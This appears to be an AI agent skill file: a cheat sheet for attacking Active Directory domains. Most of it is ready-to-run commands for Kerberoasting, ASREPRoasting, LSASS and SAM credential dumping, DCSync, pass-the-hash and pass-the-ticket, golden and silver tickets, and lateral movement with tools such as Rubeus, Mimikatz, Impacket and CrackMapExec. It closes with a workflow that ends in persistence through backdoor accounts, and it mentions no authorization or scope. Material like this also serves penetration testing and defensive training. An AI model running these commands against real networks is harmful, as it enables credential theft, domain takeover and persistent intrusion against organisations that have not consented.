---
name: attacking-active-directory
description: Attack and enumerate Active Directory environments using Kerberos attacks (Kerberoasting, ASREPRoasting), credential dumping (DCSync, Mimikatz), lateral movement (PtH, PtT), and BloodHound analysis. Use when pentesting Windows domains or exploiting AD misconfigurations.
---

# Attacking Active Directory

## When to Use

- AD reconnaissance and enumeration
- Kerberos-based attacks
- Credential dumping from domain controllers
- Lateral movement within domains
- BloodHound attack path analysis
- Domain persistence techniques

## Kerberoasting

**Windows:**
```powershell
# Check kerberoastable users
.\Rubeus.exe kerberoast /stats

# Roast all
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Target specific user
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.txt

# Target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

**Linux:**
```bash
# Impacket GetUserSPNs
GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password -outputfile hashes.txt

# With NT hash
GetUserSPNs.py -request -dc-ip 10.10.10.10 -hashes :ntlmhash domain.local/user -outputfile hashes.txt

# Target specific user
GetUserSPNs.py -request-user svc_mssql -dc-ip 10.10.10.10 domain.local/user:password
```

**Crack Hashes:**
```bash
# Hashcat (TGS-REP)
hashcat -m 13100 hashes.txt wordlist.txt

# John
john --wordlist=wordlist.txt hashes.txt
```

## ASREPRoasting

**Windows:**
```powershell
# Enumerate vulnerable users
Get-DomainUser -PreauthNotRequired

# Roast
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
.\Rubeus.exe asreproast /user:victim /format:hashcat
```

**Linux:**
```bash
# With domain creds
GetNPUsers.py domain.local/user:password -request -format hashcat -outputfile hashes.txt

# Without creds (username list)
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.10
```

**Crack AS-REP:**
```bash
hashcat -m 18200 hashes.txt wordlist.txt
```

## BloodHound

**Data Collection:**
```powershell
# Windows - SharpHound
.\SharpHound.exe -c All --zipfilename output.zip
.\SharpHound.exe -c All,GPOLocalGroup
```

**Linux:**
```bash
# bloodhound-python
bloodhound-python -u user -p password -ns 10.10.10.10 -d domain.local -c All --zip
```

**Useful Queries:**
```cypher
# Shortest path to Domain Admins
MATCH p=shortestPath((n)-[*1..]->(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p

# Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u

# AS-REP Roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u

# Unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# DCSync rights
MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p
```

## Credential Dumping

**LSASS Dumping:**
```powershell
# Task Manager: Right-click lsass.exe -> Create dump file

# procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Parse offline with mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**SAM Dumping:**
```cmd
# Save hives
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# Extract hashes (Linux)
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

**DCSync (Domain):**
```bash
# secretsdump - dump all
secretsdump.py domain.local/user:password@dc.domain.local -just-dc

# Specific user
secretsdump.py domain.local/user:password@dc.domain.local -just-dc-user krbtgt

# With NTLM hash
secretsdump.py -hashes :ntlmhash domain.local/user@dc.domain.local -just-dc
```

## Pass-the-Hash

**Windows:**
```powershell
# Mimikatz
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:hash /run:cmd.exe
```

**Linux:**
```bash
# CrackMapExec
crackmapexec smb 10.10.10.10 -u administrator -H hash
crackmapexec smb 10.10.10.10 -u administrator -H hash -x whoami

# psexec
psexec.py -hashes :hash administrator@10.10.10.10

# wmiexec
wmiexec.py -hashes :hash administrator@10.10.10.10

# evil-winrm
evil-winrm -i 10.10.10.10 -u administrator -H hash
```

## Pass-the-Ticket

**Export Tickets:**
```powershell
# Mimikatz
sekurlsa::tickets /export

# Rubeus
.\Rubeus.exe dump /nowrap
.\Rubeus.exe monitor /interval:10
```

**Import/Use Tickets:**
```powershell
# Mimikatz
kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:base64ticket

# Verify
klist
```

**Linux PtT:**
```bash
# Convert kirbi to ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Set ticket
export KRB5CCNAME=ticket.ccache

# Use ticket
psexec.py -k -no-pass domain.local/administrator@dc.domain.local
```

## Overpass-the-Hash

```powershell
# Rubeus - request TGT with NTLM hash
.\Rubeus.exe asktgt /user:administrator /domain:domain.local /rc4:hash /ptt

# With AES key (better OPSEC)
.\Rubeus.exe asktgt /user:administrator /domain:domain.local /aes256:key /ptt
```

## Golden/Silver Tickets

**Golden Ticket (TGT):**
```powershell
# Requirements: krbtgt hash, Domain SID

# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Rubeus
.\Rubeus.exe golden /rc4:hash /user:administrator /domain:domain.local /sid:S-1-5-21-... /ptt
```

**Silver Ticket (TGS):**
```powershell
# Requirements: Service account hash, Service SPN

# Mimikatz - CIFS service
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:dc.domain.local /service:cifs /rc4:hash /ptt
```

## Lateral Movement

**CrackMapExec:**
```bash
# SMB spray
crackmapexec smb 10.10.10.0/24 -u user -p password

# Execute commands
crackmapexec smb 10.10.10.10 -u admin -p password -x whoami
crackmapexec smb 10.10.10.10 -u admin -H hash -x whoami

# Dump SAM
crackmapexec smb 10.10.10.10 -u admin -p password --sam

# Dump LSA
crackmapexec smb 10.10.10.10 -u admin -p password --lsa
```

**PSExec Variants:**
```bash
# psexec
psexec.py domain/user:password@10.10.10.10

# wmiexec (stealthier)
wmiexec.py domain/user:password@10.10.10.10

# smbexec (no service)
smbexec.py domain/user:password@10.10.10.10
```

**WinRM:**
```powershell
# PowerShell
Enter-PSSession -ComputerName dc.domain.local -Credential domain\user
```

```bash
# evil-winrm
evil-winrm -i 10.10.10.10 -u administrator -p password
evil-winrm -i 10.10.10.10 -u administrator -H hash
```

## Enumeration

**Domain Info:**
```powershell
# PowerView
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainComputer
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"
```

**Linux Enumeration:**
```bash
# crackmapexec
crackmapexec smb 10.10.10.0/24 -u user -p password --users
crackmapexec smb 10.10.10.0/24 -u user -p password --groups

# ldapsearch
ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local"
```

## Quick Workflow

1. **Initial Access** → Get domain credentials
2. **Enumeration** → Run BloodHound collection
3. **Kerberoasting** → Extract and crack service tickets
4. **Lateral Movement** → Use creds to move to high-value targets
5. **Credential Dumping** → Dump LSASS/SAM on compromised hosts
6. **DCSync** → Extract all domain hashes from DC
7. **Persistence** → Golden ticket or create backdoor accounts

## Common Wins

- Kerberoasting weak service account passwords
- ASREPRoasting accounts without preauth
- BloodHound finding short paths to DA
- Pass-the-Hash from dumped credentials
- DCSync with compromised accounts that have replication rights

## Tools

- **Rubeus** - Kerberos attacks (Windows)
- **Mimikatz** - Credential dumping (Windows)
- **Impacket** - Comprehensive toolkit (Linux)
- **BloodHound** - AD relationship graphing
- **CrackMapExec** - Swiss army knife for AD
- **PowerView** - AD enumeration (PowerShell)
- **evil-winrm** - WinRM access (Linux)

## References

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://github.com/fortra/impacket
- https://github.com/GhostPack/Rubeus
- https://github.com/BloodHoundAD/BloodHound
